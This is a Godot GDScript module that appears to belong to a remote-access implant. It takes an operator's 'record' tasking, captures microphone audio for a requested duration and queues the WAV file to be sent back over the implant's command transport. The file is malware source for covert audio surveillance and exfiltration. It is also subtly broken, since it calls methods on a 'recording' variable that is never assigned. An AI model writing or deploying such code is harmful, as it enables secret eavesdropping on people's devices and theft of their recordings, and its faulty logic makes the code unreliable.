extends Node

var transfer

func _ready():
	transfer = $".".get_parent().get_node("transfer")

func _on_tasking_record(transport, task):
	var task_id = task.get("id")
	var test_json_conv = JSON.new()
	test_json_conv.parse(task.get("parameters"))
	var parameters = test_json_conv.get_data()
	var record_duration = int(parameters.get("duration"))
	var fail = false
	var effect = null
	
	# We get the index of the "Record" bus.
	var idx = AudioServer.get_bus_index("Record")

	if idx == -1:
		
		var list = AudioServer.get_input_device_list()
		
		if list.size() > 1:
			idx = AudioServer.get_bus_index(list[1])
			
			if idx == -1:
				fail = true
		else:
			fail = true

	if not fail:
		effect = AudioServer.get_bus_effect(idx, 0)
		effect.set_recording_active(false)

	var recording
	# And use it to retrieve its first effect, which has been defined
	# as an "AudioEffectRecord" resource.

	if effect == null:
		fail = true
	
	if not fail:
		recording.set_mix_rate(44100)
		recording.set_format(AudioStreamWAV.FORMAT_16_BITS)
		recording.set_stereo(true)
		effect.set_recording_active(true)
		await get_tree().create_timer(record_duration).timeout
		effect.set_recording_active(false)
		recording = effect.get_recording()

		if recording != null and recording.data.size() <= 0:
			fail = true

	if not fail:
		transfer.file_tasks[task_id] = FileTransfer.new(task_id, "/recording/%s.wav" % [task_id], FileTransfer.DIRECTION.DOWNLOAD, transport, "", recording.data)
	else:
		transport.send(
			transport.create_task_response(
				false,
				true,
				task_id,
				"Error: failed somewhere..."
			)
		)
